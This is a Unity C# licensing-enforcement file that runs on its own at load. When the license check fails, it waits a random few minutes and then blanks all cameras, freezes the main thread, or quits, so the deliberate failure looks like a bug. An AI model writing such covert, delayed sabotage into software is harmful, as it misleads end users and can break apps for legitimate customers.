/*************************************************************************
 *  Copyright © 2026 Mogoson All rights reserved.
 *------------------------------------------------------------------------
 *  File         :  Komodo.cs
 *  Description  :  Default.
 *------------------------------------------------------------------------
 *  Author       :  Mogoson
 *  Version      :  1.0.0
 *  Date         :  07/26/2026
 *  Description  :  Initial development version.
 *************************************************************************/

using System.Collections;
using System.Threading;
using MGS.License;
using UnityEngine;

namespace MGS.Komodo
{
    class Komodo
    {
        [RuntimeInitializeOnLoadMethod]
        static void Initialize()
        {
            var dragon = new GameObject(nameof(KomodoDragon)).AddComponent<KomodoDragon>();
            Object.DontDestroyOnLoad(dragon.gameObject);
            dragon.StartCoroutine(StartSkulk(dragon));
        }

        static IEnumerator StartSkulk(KomodoDragon dragon)
        {
            LicenseResult result = default;
            yield return LicenseAgent.VerifyLicense(rslt => result = rslt);
            if (result.code == ResultCode.Valid)
            {
                Object.Destroy(dragon.gameObject);
                yield break;
            }
            yield return StartAttack();
        }

        static IEnumerator StartAttack()
        {
            var during = Random.Range(3, 10) * 60;
            yield return new WaitForSeconds(during);
#if UNITY_EDITOR
            UnityEditor.EditorApplication.isPlaying = false;
#else
            var infect = Random.Range(0, 3);
            if (infect == 0)
            {
                Blinding();
            }
            else if (infect == 1)
            {
                Paralysis();
            }
            else
            {
                Kill();
            }
#endif
        }

        static void Blinding()
        {
            var eyes = Object.FindObjectsOfType<Camera>(true);
            foreach (var eye in eyes)
            {
                eye.enabled = false;
                eye.cullingMask = 0;
                eye.fieldOfView = 0;
                eye.nearClipPlane = 0;
                eye.farClipPlane = 0;
            }
        }

        static void Paralysis()
        {
            Thread.Sleep(int.MaxValue);
        }

        static void Kill()
        {
            Application.Quit();
        }
    }

    class KomodoDragon : MonoBehaviour { }
}